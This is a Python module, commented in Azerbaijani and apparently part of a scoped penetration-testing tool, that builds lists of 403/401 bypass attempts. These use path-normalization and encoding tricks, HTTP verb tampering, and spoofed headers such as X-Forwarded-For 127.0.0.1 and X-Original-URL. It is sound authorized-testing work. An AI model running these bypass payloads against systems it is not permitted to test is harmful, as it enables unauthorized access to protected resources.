"""WAF/filter bypass payload matrisi — Faza 3 (yalnız İCAZƏLİ scope daxilində).

Bu modul HTTP səviyyəsində 401/403 (və bəzən 404) cavablarının **aşıla
biləcəyini** yoxlamaq üçün müxtəlif texnikalar generasiya edir:

  * path normalizasiya tricks: `..;/`, `%2e%2e`, `//`, `/.`, `%2f`, `;`
  * encoding variants: single/double URL-encode, unicode, mixed case
  * HTTP verb tampering: GET/HEAD/POST/PUT/OPTIONS/TRACE
  * header tricks: `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`,
    `X-Custom-IP-Authorization`, `X-Forwarded-Host`, `Referer` ...

Burada heç bir "avtomatik CAPTCHA" yoxdur və heç bir kod scope yoxlamasını
keçmir — bütün sorğular Guardian/HttpPolicy-dən (scope + rate) keçir.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from urllib.parse import quote, urlsplit, urlunsplit

from yarl import URL as _YURL

#: 403/401 aşmaq üçün HTTP başlıq dəstləri.
HEADER_TRICKS: list[tuple[str, dict]] = [
    ("localhost-via-xff", {"X-Forwarded-For": "127.0.0.1"}),
    ("internal-ip-xff", {"X-Forwarded-For": "10.0.0.1"}),
    ("xff-original", {"X-Forwarded-For": "127.0.0.1",
                      "X-Forwarded-Host": "localhost"}),
    ("x-original-url", {"X-Original-URL": "/"}),
    ("x-rewrite-url", {"X-Rewrite-URL": "/"}),
    ("x-custom-ip", {"X-Custom-IP-Authorization": "127.0.0.1"}),
    ("x-real-ip", {"X-Real-IP": "127.0.0.1"}),
    ("x-client-ip", {"X-Client-IP": "127.0.0.1"}),
    ("x-host-localhost", {"X-Host": "localhost"}),
    ("forwarded-127", {"Forwarded": "for=127.0.0.1;host=localhost"}),
    ("referer-internal", {"Referer": "http://localhost/"}),
]

#: Verb tampering ardıcıllığı (state dəyişməyən sorğular əvvəldə).
VERBS = ["GET", "HEAD", "OPTIONS", "POST", "PUT", "TRACE"]

#: Path-a əlavə/təqlid edilən segmentlər (normalizasiya zəifliyini axtarır).
PATH_SUFFIXES = [
    ("dot-slash", "/."),
    ("slash-slash", "//"),
    ("semicolon", ";"),
    ("semicolon-slash", "/;"),
    ("semicolon..-slash", "/..;/"),
    ("encoded-dot", "/%2e/"),
    ("double-encoded-dot", "/%252e/"),
    ("encoded-slash", "%2f"),
    ("trailing-slash", "/"),
    ("hash", "#"),
    ("query-null", "?%00"),
    ("case-body", "/%2e%2e/"),
]


def _encoded_variants(text: str) -> list[tuple[str, str]]:
    """Bir path üçün encoding/format variantlarını qaytarır.

    Başlanğıc `/` həmişə qorunur → variant yeni resursa (məs. kökə) düşmür və
    yalançı "bypass" yaratmır.
    """
    lead = "/" if text.startswith("/") else ""
    body = text[1:] if lead else text
    out: list[tuple[str, str]] = [("plain", text)]
    if body:
        out.append(("upper", lead + body.upper()))
        out.append(("single-encode", lead + quote(body, safe="")))
        out.append(("double-encode",
                    lead + quote(quote(body, safe=""), safe="")))
        if "/" in body:
            out.append(("mixed-slash", lead + body.replace("/", "%2f")))
    seen: set[str] = set()
    uniq: list[tuple[str, str]] = []
    for label, val in out:
        if val not in seen:
            seen.add(val)
            uniq.append((label, val))
    return uniq


@dataclass
class BypassAttempt:
    """Tək bypass cəhdi (Guardian-ə veriləcək sorğu təsviri)."""

    label: str
    url: str
    method: str = "GET"
    headers: dict = field(default_factory=dict)


def _with_path(url: str, new_path: str) -> str:
    parts = urlsplit(url)
    return urlunsplit((parts.scheme, parts.netloc, new_path, parts.query,
                       parts.fragment))


def _effective_raw_path(u: str) -> str:
    """Müştərinin (yarl) həqiqətən göndərəcəyi normallaşdırılmış raw path."""
    try:
        return _YURL(u).raw_path or "/"
    except Exception:  # noqa: BLE001 — etibarsız URL → boş
        return ""


def _candidate(label: str, url: str, new_path: str) -> BypassAttempt | None:
    """Path variantını qurur; resursu dəyişərsə (host və ya kök) → None.

    İki qoruma var (yalançı "bypass" qarşısını alır):
      1. Variant authority-ni (`#`/`?`) dəyişərsə — host fərqlənərsə atılır.
      2. Müştəri tərəfindən normallaşdırma `..`/`%2e` segmentlərini kökə
         çökdürürsə (yarl ground-truth) — atılır.
    """
    parts = urlsplit(url)
    new_url = _with_path(url, new_path)
    got = urlsplit(new_url)
    if got.netloc != parts.netloc:
        return None
    if not got.path.startswith("/"):
        return None
    base_eff = _effective_raw_path(url) or "/"
    new_eff = _effective_raw_path(new_url) or "/"
    if new_eff == "/" and base_eff != "/":
        return None
    return BypassAttempt(label, new_url)


def path_attempts(url: str, *, max_items: int = 40) -> list[BypassAttempt]:
    """Path normalizasiya + encoding texnikalarını generasiya edir."""
    parts = urlsplit(url)
    base_path = parts.path or "/"
    attempts: list[BypassAttempt] = []

    for label, path in _encoded_variants(base_path):
        cand = _candidate(f"path-{label}", url, path)
        if cand:
            attempts.append(cand)

    for label, suffix in PATH_SUFFIXES:
        if base_path.endswith("/") and suffix.startswith("/"):
            new_path = base_path[:-1] + suffix
        else:
            new_path = base_path + suffix
        cand = _candidate(f"path-{label}", url, new_path)
        if cand:
            attempts.append(cand)
        # həmçinin path-dən ƏVVƏL (yalnız resursu qoruyan təhlükəsiz variantlar)
        cand = _candidate(f"path-pre-{label}", url, suffix + base_path)
        if cand:
            attempts.append(cand)

    return _dedupe(attempts)[:max_items]


def header_attempts(url: str, *, host: str | None = None,
                    max_items: int = 20) -> list[BypassAttempt]:
    """Header-əsaslı bypass cəhdləri."""
    if host is None:
        host = urlsplit(url).hostname or ""
    attempts = [BypassAttempt(f"header-{label}", url, "GET", dict(hdrs))
                for label, hdrs in HEADER_TRICKS]
    # Host başlığını override edən variasiya (yalnız scope-daxili)
    attempts.append(BypassAttempt("header-host-self", url, "GET",
                                  {"Host": host}))
    return _dedupe(attempts)[:max_items]


def verb_attempts(url: str, *, methods: list[str] | None = None) -> list[BypassAttempt]:
    """HTTP verb tampering cəhdləri."""
    return [BypassAttempt(f"verb-{m}", url, m) for m in (methods or VERBS)]


def build_matrix(url: str, *, include_headers: bool = True,
                 include_verbs: bool = True, max_items: int = 80
                 ) -> list[BypassAttempt]:
    """Tam bypass matrisini (path + header + verb) qurur və təkrarları silir."""
    attempts = path_attempts(url)
    if include_headers:
        attempts += header_attempts(url)
    if include_verbs:
        attempts += verb_attempts(url)
    return _dedupe(attempts)[:max_items]


def _dedupe(attempts: list[BypassAttempt]) -> list[BypassAttempt]:
    seen: set[tuple] = set()
    out: list[BypassAttempt] = []
    for a in attempts:
        key = (a.method, a.url, tuple(sorted(a.headers.items())))
        if key in seen:
            continue
        seen.add(key)
        out.append(a)
    return out
